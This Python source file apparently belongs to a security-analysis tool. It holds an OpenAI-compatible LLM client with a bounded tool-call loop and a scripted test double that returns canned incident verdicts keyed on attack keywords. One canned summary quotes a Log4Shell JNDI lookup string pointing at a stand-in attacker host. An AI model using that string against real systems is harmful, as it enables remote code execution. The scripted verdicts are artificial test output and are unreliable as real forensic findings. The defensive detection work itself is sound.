from __future__ import annotations

import asyncio
import json
from collections.abc import Awaitable, Callable
from typing import Any

import httpx2

from terminus.http import create_async_client
from terminus.llm.base import JsonValue, LlmClient, LlmError


class OpenAiCompatibleLlm(LlmClient):
    def __init__(self, base_url: str, api_key: str, model: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.model = model

    async def respond_json(self, system: str, user: str) -> dict[str, JsonValue]:
        async with create_async_client() as client:
            try:
                response = await client.post(
                    f"{self.base_url}/chat/completions",
                    headers={
                        "Authorization": f"Bearer {self.api_key}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": self.model,
                        "messages": [
                            {"role": "system", "content": system},
                            {"role": "user", "content": user},
                        ],
                        "response_format": {"type": "json_object"},
                    },
                )
                response.raise_for_status()
                data = response.json()
                content = data["choices"][0]["message"]["content"]
                result = json.loads(content)
                if not isinstance(result, dict):
                    raise LlmError("Expected JSON object")
                return result
            except (httpx2.HTTPError, json.JSONDecodeError, KeyError) as e:
                raise LlmError(f"LLM request failed: {e}") from e

    async def chat_with_tools(
        self,
        system: str,
        user: str,
        tools: list[dict[str, Any]],
        execute: Callable[[str, dict[str, Any]], Awaitable[dict[str, Any]]],
        max_rounds: int = 4,
    ) -> tuple[str, list[str]]:
        """Run a bounded read-only tool conversation using the chat completions API."""
        messages: list[dict[str, Any]] = [
            {"role": "system", "content": system},
            {"role": "user", "content": user},
        ]
        used: list[str] = []
        async with create_async_client() as client:
            for round_index in range(max_rounds + 1):
                payload: dict[str, Any] = {
                    "model": self.model,
                    "messages": messages,
                    "tools": tools,
                    "tool_choice": "none" if round_index == max_rounds else "auto",
                    "max_completion_tokens": 2400,
                }
                if self.model.startswith("openai/gpt-oss-"):
                    payload["reasoning_effort"] = "low"
                try:
                    for attempt in range(3):
                        response = await client.post(
                            f"{self.base_url}/chat/completions",
                            headers={"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"},
                            json=payload,
                        )
                        if response.status_code == 429 and attempt < 2:
                            try:
                                delay = float(response.headers.get("retry-after", "4"))
                            except ValueError:
                                delay = 4.0
                            await asyncio.sleep(min(max(delay, 1.0), 20.0))
                            continue
                        if response.status_code == 400 and attempt < 2:
                            try:
                                error_code = response.json().get("error", {}).get("code")
                            except ValueError:
                                error_code = None
                            if error_code in {"tool_use_failed", "tool_call_error", "invalid_request_error"}:
                                payload.pop("tools", None)
                                payload.pop("tool_choice", None)
                                await asyncio.sleep(0.5)
                                continue
                        break
                    if response.status_code == 400:
                        try:
                            error_code = response.json().get("error", {}).get("code", "invalid_request")
                        except ValueError:
                            error_code = "invalid_request"
                        raise LlmError(f"Tool chat request rejected ({error_code})")
                    response.raise_for_status()
                    message = response.json()["choices"][0]["message"]
                except (httpx2.HTTPError, KeyError, IndexError, ValueError) as exc:
                    raise LlmError(f"Tool chat request failed: {exc}") from exc

                calls = message.get("tool_calls") or []
                if not calls:
                    content = message.get("content")
                    if not isinstance(content, str) or not content.strip():
                        raise LlmError(f"Tool chat returned no answer (finish_reason={response.json()['choices'][0].get('finish_reason')})")
                    return content.strip().replace("\u2011", "-").replace("\u2013", "-"), used

                if round_index == max_rounds:
                    raise LlmError("Tool chat exceeded its tool call limit")
                messages.append({"role": "assistant", "content": message.get("content"), "tool_calls": calls})
                for call in calls:
                    function = call.get("function") or {}
                    name = str(function.get("name") or "")
                    try:
                        arguments = json.loads(function.get("arguments") or "{}")
                        if not isinstance(arguments, dict):
                            raise ValueError("Arguments must be an object")
                        result = await execute(name, arguments)
                    except (json.JSONDecodeError, ValueError) as exc:
                        result = {"error": f"Invalid tool arguments: {exc}"}
                    used.append(name)
                    messages.append({"role": "tool", "tool_call_id": call.get("id"), "content": json.dumps(result, default=str)})
        raise LlmError("Tool chat failed to produce an answer")


class ScriptedLlm(LlmClient):
    def __init__(self) -> None:
        pass

    async def respond_json(self, system: str, user: str) -> dict[str, JsonValue]:
        user_upper = user.upper()

        if "LOG4J" in user_upper or "44228" in user_upper or "JNDI" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Remote Code Execution payload detected targeting NGINX web server via JNDI LDAP lookup string (${jndi:ldap://evil-attacker.com:1389/a}). Vector indicates active exploitation attempt for CVE-2021-44228.",
                "recommended_actions": [
                    "Immediately block source IP 192.168.1.100 at boundary firewall",
                    "Isolate endpoint prod-web-front-01 from internal subnet",
                    "Patch Java runtime & update log4j2 library to >= 2.17.1",
                    "Rotate database service account credentials"
                ],
            }
        if "LSASS" in user_upper or "1003" in user_upper or "DUMP" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Credential Access activity detected (MITRE ATT&CK T1003). LSASS memory access attempt executed by unauthorized process. High probability of Mimikatz or ProcDump execution.",
                "recommended_actions": [
                    "Kill unauthorized process ID",
                    "Revoke domain admin credentials for affected workstation",
                    "Enforce LSA Protection (RunAsPPL) via Group Policy",
                    "Initiate endpoint memory triage"
                ],
            }
        if "RANSOMWARE" in user_upper or "1486" in user_upper or "ENCRYPT" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: High-velocity file modification and extension manipulation detected (.locked extensions). Active Ransomware activity (MITRE T1486).",
                "recommended_actions": [
                    "Isolate host network interface immediately",
                    "Trigger automated volume shadow copy recovery",
                    "Revoke domain machine account access"
                ],
            }
        if "KERBEROAST" in user_upper or "1558" in user_upper or "TGS" in user_upper:
            return {
                "severity": "high",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: High-volume Kerberos TGS requests (RC4-HMAC encryption) detected targeting service accounts. Pattern indicates active Kerberoasting attack to offline crack SPN passwords.",
                "recommended_actions": [
                    "Force password reset on targeted SPN service accounts",
                    "Upgrade SPN encryption to AES256-CTS-HMAC-SHA1-96",
                    "Audit Active Directory TGS request logs for anomalous user accounts"
                ],
            }
        if "BRUTE" in user_upper or "PASSWORD SPRAY" in user_upper:
            return {
                "severity": "high",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Automated SSH password spraying attack detected. 45 failed authentication attempts within 60 seconds targeting root and admin accounts.",
                "recommended_actions": [
                    "Add attacker IP to fail2ban dynamic blocklist",
                    "Enforce SSH public key authentication and disable password logins",
                    "Verify root login is disabled in sshd_config"
                ],
            }
        if (
            "POWERSHELL" in user_upper
            or "T1059" in user_upper
            or "ENCODEDCOMMAND" in user_upper
            or "INVOKE-" in user_upper
            or "BASE64" in user_upper
        ):
            return {
                "severity": "high",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Suspicious execution of encoded / obfuscated command interpreter detected (MITRE ATT&CK T1059). De-obfuscation engine identified suspicious command invocations.",
                "recommended_actions": [
                    "Inspect parent process tree and script block logging",
                    "Terminate unauthorized process ID",
                    "Audit user endpoint privileges",
                ],
            }
        if (
            "PROMPT INJECTION" in user_upper
            or "INJECTION" in user_upper
            or "OVERRIDE" in user_upper
            or "EXPLOIT" in user_upper
        ):
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Adversarial web exploitation attempt with active evasion / prompt manipulation detected.",
                "recommended_actions": [
                    "Block attacking source IP at perimeter firewall",
                    "Isolate targeted web frontend service",
                    "Review application WAF filtering rules",
                ],
            }
        return {
            "severity": "medium",
            "confidence": "high",
            "summary": "Scripted test summary.",
            "recommended_actions": ["Isolate host", "Check logs"],
        }
